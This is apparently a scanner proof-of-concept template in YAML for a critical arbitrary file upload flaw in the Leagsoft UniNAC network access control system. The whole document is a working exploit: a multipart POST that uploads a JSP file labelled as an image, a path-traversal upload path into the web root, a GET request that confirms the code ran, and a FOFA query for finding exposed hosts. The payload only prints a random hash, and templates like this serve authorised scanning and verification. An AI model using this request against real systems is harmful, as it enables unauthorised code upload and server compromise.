id: poc-yaml-nacc-uploadfiletopath-htm-anyfile-upload
info:
  name: 联软网络准入控制系统 uploadfileToPath.htm 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: nacc
  fofa: app="联软科技-UniNAC"
variables:
  t1: random_str(4)
  t2: md5(t1)
requests:
- method: POST
  path: /uai/download/uploadfileToPath.htm
  data: '-----------------------------570xxxxxxxxx6025274xxxxxxxx1

    Content-Disposition: form-data; name="input_localfile"; filename="{{.t1}}.jsp"

    Content-Type: image/png


    <% out.println("{{.t2}}");%>

    -----------------------------570xxxxxxxxx6025274xxxxxxxx1

    Content-Disposition: form-data; name="uploadpath"


    ../webapps/notifymsg/devreport/

    -----------------------------570xxxxxxxxx6025274xxxxxxxx1--'
  expression: 'status_code == 200

    && contains(body,"文件上传成功")

    '
- method: GET
  path: /notifymsg/devreport/{{.t1}}.jsp
  expression: status_code == 200 && contains(body,t2)
transport: http
